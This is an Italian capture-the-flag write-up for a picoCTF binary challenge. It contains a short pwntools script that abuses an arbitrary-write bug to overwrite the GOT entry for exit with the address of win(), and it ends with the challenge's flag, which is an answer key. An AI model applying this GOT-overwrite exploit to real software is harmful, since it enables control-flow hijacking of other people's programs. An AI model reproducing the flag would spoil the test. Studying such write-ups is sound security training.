# Writeup

Il seguente programma chiede all'utente di specificare un indirizzo
e poi inserire il valore da sovrascrivere all'indirizzo scelto.

Sfrutto questa vulnerabilita' per sovrascrivere il comportamento della funzione `exit(1)`.
Tramite il seguente codice python:
```py
from pwn import *

context.binary = './vuln'

p = process()

p.sendline(str(context.binary.got['exit']).encode('ascii'))
p.sendline(str(context.binary.symbols['win']).encode('ascii'))
log.success(p.recvline_regex(rb".*{.*}.*").decode("ascii"))
```
posso sovrascrivere la `GOT`, facendo in modo che quando viene chiamata la funzione `exit(1)`
in realta' venga eseguita `win()`, dato che la tabella GOT, ovvero quella che tiene conto
dei collecamenti con le libreria dinamiche, ora come valore della entry `exit` non ha piu'
l'indirizzo della DLL originale, bensi' l'indirizzo della funzione win.

Dopo aver eseguito la funzione `win()` ottengo in console il valore della flag

# Flag
```plain
picoCTF{A_s0ng_0f_1C3_and_f1r3_e122890e}
```